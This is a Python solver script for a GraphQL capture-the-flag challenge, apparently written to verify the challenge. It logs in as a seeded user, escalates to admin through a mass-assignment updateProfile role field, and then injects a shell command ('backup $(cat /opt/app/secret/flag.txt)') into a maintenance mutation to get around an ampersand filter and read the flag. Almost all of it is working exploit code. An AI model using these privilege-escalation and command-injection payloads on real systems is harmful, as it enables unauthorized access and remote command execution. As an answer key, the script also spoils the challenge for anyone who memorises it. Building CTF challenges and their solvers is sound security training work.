#!/usr/bin/env python3
import argparse
import re
import sys

import requests


class SolveError(Exception):
    pass


def gql(base_url, query, variables=None, token=None, expect_errors=False):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    response = requests.post(
        base_url.rstrip("/") + "/graphql",
        json={"query": query, "variables": variables or {}},
        headers=headers,
        timeout=10,
    )
    try:
        data = response.json()
    except ValueError as exc:
        raise SolveError(f"Non-JSON response: HTTP {response.status_code}") from exc

    if response.status_code >= 400 and not expect_errors:
        raise SolveError(f"HTTP {response.status_code}: {data}")
    if data.get("errors") and not expect_errors:
        raise SolveError(str(data["errors"]))
    return data


def main():
    parser = argparse.ArgumentParser(description="Blueprint solver")
    parser.add_argument("url", nargs="?", default="http://127.0.0.1:8011")
    args = parser.parse_args()

    base = args.url

    introspection = gql(
        base,
        "{ __schema { types { name } } }",
        expect_errors=True,
    )
    if not introspection.get("errors"):
        raise SolveError("Introspection unexpectedly succeeded")

    probe = gql(
        base,
        "mutation { runMaintenanceTask(scriptz: \"status\") { output } }",
        expect_errors=True,
    )
    if "Unknown argument" not in str(probe):
        raise SolveError("Hidden mutation probe did not produce useful validation output")

    login = gql(
        base,
        """
        mutation Login($username: String!, $password: String!) {
          login(username: $username, password: $password) {
            token
            user { id username role }
          }
        }
        """,
        {"username": "bob", "password": "password123"},
    )
    token = login["data"]["login"]["token"]
    if login["data"]["login"]["user"]["role"] != "member":
        raise SolveError("Seed user bob is not a member")

    forbidden = gql(
        base,
        'mutation { runMaintenanceTask(script: "status") { output } }',
        token=token,
        expect_errors=True,
    )
    if "Forbidden" not in str(forbidden):
        raise SolveError("Member could call runMaintenanceTask before escalation")

    escalated = gql(
        base,
        """
        mutation {
          updateProfile(role: "admin", bio: "temporary release helper") {
            id
            role
          }
        }
        """,
        token=token,
    )
    if escalated["data"]["updateProfile"]["role"] != "admin":
        raise SolveError("Privilege escalation failed")

    blocked = gql(
        base,
        'mutation { runMaintenanceTask(script: "backup && id") { output } }',
        token=token,
        expect_errors=True,
    )
    if "Maintenance task rejected" not in str(blocked):
        raise SolveError("Ampersand filter is not enforced")

    result = gql(
        base,
        """
        mutation {
          runMaintenanceTask(script: "backup $(cat /opt/app/secret/flag.txt)") {
            output
          }
        }
        """,
        token=token,
    )
    output = result["data"]["runMaintenanceTask"]["output"]
    match = re.search(r"HOLOGY9\{[^}]+\}", output)
    if not match:
        raise SolveError(f"Flag not found in output: {output!r}")

    print(match.group(0))


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        sys.exit(1)
